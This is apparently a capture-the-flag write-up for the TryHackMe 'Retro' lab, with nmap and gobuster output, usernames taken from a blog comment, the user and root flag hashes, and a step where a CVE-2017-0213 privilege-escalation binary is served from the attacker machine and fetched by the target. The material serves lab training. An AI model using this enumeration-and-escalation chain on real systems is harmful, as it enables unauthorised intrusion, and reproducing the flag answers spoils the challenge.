# Retro

New high score!

[Retro](https://tryhackme.com/room/retro)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- CVE-2017-0213 - Windows COM Aggregate Marshaler/IRemUnknown2

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Pwn

Can you time travel? If not, you might want to think about the next best thing.

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

---

There are two distinct paths that can be taken on Retro. One requires significantly less trial and error, however, both will work. Please check writeups if you are curious regarding the two paths. An alternative version of this room is available in it's remixed version Blaster.

```
kali@kali:~/CTFs/tryhackme/Retro$ sudo nmap -A -p- -sC -sV -Pn 10.10.222.128
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 09:46 CEST
Nmap scan report for 10.10.222.128
Host is up (0.039s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-10-04T07:51:25+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-10-03T07:44:58
|_Not valid after:  2021-04-04T07:44:58
|_ssl-date: 2020-10-04T07:51:26+00:00; +3m07s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (89%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3m06s, deviation: 0s, median: 3m06s

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   38.93 ms 10.8.0.1
2   38.96 ms 10.10.222.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.01 seconds
```

1. A web server is running on the target. What is the hidden directory which the website lives on?

```
kali@kali:~/CTFs/tryhackme/Retro$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.222.128
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.222.128
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/04 09:50:53 Starting gobuster
===============================================================
/retro (Status: 301)
Progress: 31140 / 220561 (14.12%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/04 09:53:15 Finished
===============================================================
```

`/retro`

- [One Comment on “Ready Player One”](http://10.10.222.128/retro/index.php/2019/12/09/ready-player-one/#comment-2)

![](2020-10-04_09-54.png)

- `wade`
- `parzival`

2. user.txt

![](2020-10-04_09-57.png)

`3b99fbdc6d430bfb51c72c651a261927`

3. root.txt

```
kali@kali:~/CTFs/tryhackme/Retro$ unzip CVE-2017-0213_x64.zip
Archive:  CVE-2017-0213_x64.zip
  inflating: CVE-2017-0213_x64.exe
kali@kali:~/CTFs/tryhackme/Retro$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.222.128 - - [04/Oct/2020 10:11:22] "GET / HTTP/1.1" 200 -
10.10.222.128 - - [04/Oct/2020 10:11:22] code 404, message File not found
10.10.222.128 - - [04/Oct/2020 10:11:22] "GET /favicon.ico HTTP/1.1" 404 -
10.10.222.128 - - [04/Oct/2020 10:11:34] "GET /CVE-2017-0213_x64.exe HTTP/1.1" 200 -
```

![](2020-10-04_10-14.png)

`7958b569565d7bd88d10c6f22d1c4063`
